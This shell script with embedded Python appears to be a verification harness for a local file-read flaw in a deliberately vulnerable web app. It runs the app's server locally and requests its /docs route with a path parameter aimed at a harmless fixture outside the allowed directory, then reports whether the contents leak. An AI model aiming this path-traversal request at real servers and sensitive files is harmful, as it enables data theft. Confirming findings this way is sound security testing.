#!/bin/sh
set -u
cd /workspace || { printf '%s\n' 'RuntimeError: workspace_unavailable' 'Traceback (function names only): shell_setup' >&2; exit 2; }
command -v python3 >/dev/null 2>&1 || { printf '%s\n' 'RuntimeError: python3_unavailable' 'Traceback (function names only): shell_setup' >&2; exit 2; }
scratch=$(mktemp -d /tmp/sastsimi.XXXXXXXX) || { printf '%s\n' 'RuntimeError: temporary_storage_unavailable' 'Traceback (function names only): shell_setup' >&2; exit 2; }
trap 'rm -rf "$scratch"' EXIT HUP INT TERM
PYTHONDONTWRITEBYTECODE=1 TMPDIR="$scratch" XDG_CACHE_HOME="$scratch" python3 - "$scratch" <<'PY'
import ast
import contextlib
import hashlib
import http.client
import http.server
import importlib
import importlib.util
import inspect
import io
import os
from pathlib import Path
import re
import sqlite3
import sys
import threading
import traceback
import urllib.parse

root = Path('/workspace')
scratch = Path(sys.argv[1])
os.chdir(root)
sys.dont_write_bytecode = True
sys.path = [p for p in sys.path if os.path.abspath(p or '/workspace') != '/workspace/dsvpwa']
sys.path.insert(0, str(root))

def safe_name(value, dotted=False):
    pattern = r'[A-Za-z_][A-Za-z_0-9]*(\.[A-Za-z_][A-Za-z_0-9]*)*' if dotted else r'[A-Za-z_][A-Za-z_0-9]*'
    return isinstance(value, str) and re.fullmatch(pattern, value) and not re.search(r'(?i)secret|token|password|credential|key', value)

def report_error(exc):
    if isinstance(exc, ModuleNotFoundError):
        label = 'ModuleNotFoundError: ' + (exc.name if safe_name(exc.name, True) else 'unresolved_module')
    elif isinstance(exc, NameError):
        value = getattr(exc, 'name', None)
        label = 'NameError: ' + (value if safe_name(value) else 'unresolved_global')
    elif isinstance(exc, AttributeError):
        value = getattr(exc, 'name', None)
        label = 'AttributeError: ' + (value if safe_name(value) else 'unresolved_member')
    elif isinstance(exc, sqlite3.OperationalError):
        label = 'OperationalError: writable_storage'
    else:
        label = type(exc).__name__ + ': runtime_failure'
    print(label, file=sys.stderr)
    frames = traceback.extract_tb(exc.__traceback__)
    print('Traceback (function names only): ' + ' -> '.join(frame.name for frame in frames[-6:]), file=sys.stderr)

def inconclusive(reason):
    print('HTTP /docs observation: ' + reason)
    print('SASTSIMI_POC_INCONCLUSIVE')
    return 0

def verify_storage():
    # This revision uses in-memory SQLite. Do not invent a database filename.
    for source in (root / 'dsvpwa').rglob('*.py'):
        tree = ast.parse(source.read_text(encoding='utf-8'))
        constants = {}
        for node in ast.walk(tree):
            if isinstance(node, ast.Assign) and isinstance(node.value, ast.Constant) and isinstance(node.value.value, str):
                for target in node.targets:
                    if isinstance(target, ast.Name):
                        constants[target.id] = node.value.value
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            func = node.func
            if not (isinstance(func, ast.Attribute) and func.attr == 'connect' and isinstance(func.value, ast.Name) and func.value.id == 'sqlite3'):
                continue
            arg = node.args[0] if node.args else next((item.value for item in node.keywords if item.arg == 'database'), None)
            if isinstance(arg, ast.Constant) and arg.value == ':memory:':
                continue
            if isinstance(arg, ast.Name) and constants.get(arg.id) == ':memory:':
                continue
            raise RuntimeError('storage_path_unverified')

def classes(module, base):
    return [value for value in vars(module).values() if isinstance(value, type) and value.__module__ == module.__name__ and value is not base and issubclass(value, base)]

def server_arguments(server_class, handler_class):
    args, kwargs = [], {}
    for name, parameter in inspect.signature(server_class).parameters.items():
        if parameter.kind in (inspect.Parameter.VAR_POSITIONAL, inspect.Parameter.VAR_KEYWORD):
            continue
        lower = name.lower()
        if lower in ('server_address', 'address', 'listen_address'):
            value = ('127.0.0.1', 0)
        elif lower in ('requesthandlerclass', 'handler', 'handler_class'):
            value = handler_class
        elif lower == 'port':
            value = 0
        elif lower in ('host', 'hostname', 'interface'):
            value = '127.0.0.1'
        elif lower in ('risk', 'risk_level'):
            value = 3
        elif lower in ('security_mode', 'mode'):
            value = 'vulnerable'
        elif parameter.default is not inspect.Parameter.empty:
            continue
        else:
            return None
        if parameter.kind == inspect.Parameter.POSITIONAL_ONLY:
            args.append(value)
        else:
            kwargs[name] = value
    return args, kwargs

def request(port, target):
    connection = http.client.HTTPConnection('127.0.0.1', port, timeout=5)
    try:
        connection.request('GET', target)
        response = connection.getresponse()
        return response.status, response.read().decode('utf-8', errors='replace')
    finally:
        connection.close()

def main():
    source = root / 'dsvpwa' / 'attacks.py'
    if not source.is_file():
        return inconclusive('pinned attack source unavailable')
    if hashlib.sha256(source.read_bytes()).hexdigest() != '64f81f5447d65c0e5df4c0ad7c2c58ecc3a6c02453b917e2bb8da4a25205e07f':
        return inconclusive('attack source differs from pinned revision')
    package = importlib.util.find_spec('dsvpwa')
    if package is None or package.submodule_search_locations is None:
        return inconclusive('repository package unavailable')
    verify_storage()
    handler_source = root / 'dsvpwa' / 'handlers.py'
    if not handler_source.is_file():
        return inconclusive('repository HTTP handler unavailable')
    handler_module = importlib.import_module('dsvpwa.handlers')
    handlers = classes(handler_module, http.server.BaseHTTPRequestHandler)
    if len(handlers) != 1:
        return inconclusive('repository HTTP handler class ambiguous')
    servers = classes(handler_module, http.server.HTTPServer)
    server_source = root / 'dsvpwa' / 'server.py'
    if server_source.is_file():
        server_module = importlib.import_module('dsvpwa.server')
        servers.extend(classes(server_module, http.server.HTTPServer))
    if len(servers) > 1:
        return inconclusive('repository server class ambiguous')
    server_class = servers[0] if servers else http.server.HTTPServer
    arguments = server_arguments(server_class, handlers[0])
    if arguments is None:
        return inconclusive('repository server startup parameters unverified')
    fixture = scratch / 'fixture.txt'
    fixture_value = 'sastsimi_local_read_fixture_7f24c9'
    fixture.write_text(fixture_value, encoding='utf-8')
    server = server_class(*arguments[0], **arguments[1])
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        target = '/docs?' + urllib.parse.urlencode({'path': str(fixture)})
        with contextlib.redirect_stderr(io.StringIO()):
            try:
                status, body = request(server.server_address[1], target)
            except (OSError, http.client.HTTPException):
                return inconclusive('request ended before an HTTP response')
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)
    found = fixture_value in body
    print('Repository route requested: /docs')
    print('Fixture outside repository documents directory: yes')
    print('HTTP status: ' + str(status))
    print('Fixture contents in HTTP response: ' + ('yes' if found else 'no'))
    if status == 200 and found:
        print('SASTSIMI_POC_REPRODUCED')
        return 0
    return inconclusive('route response did not expose fixture contents')

try:
    sys.exit(main())
except BaseException as exc:
    if isinstance(exc, SystemExit):
        raise
    report_error(exc)
    sys.exit(2)
PY
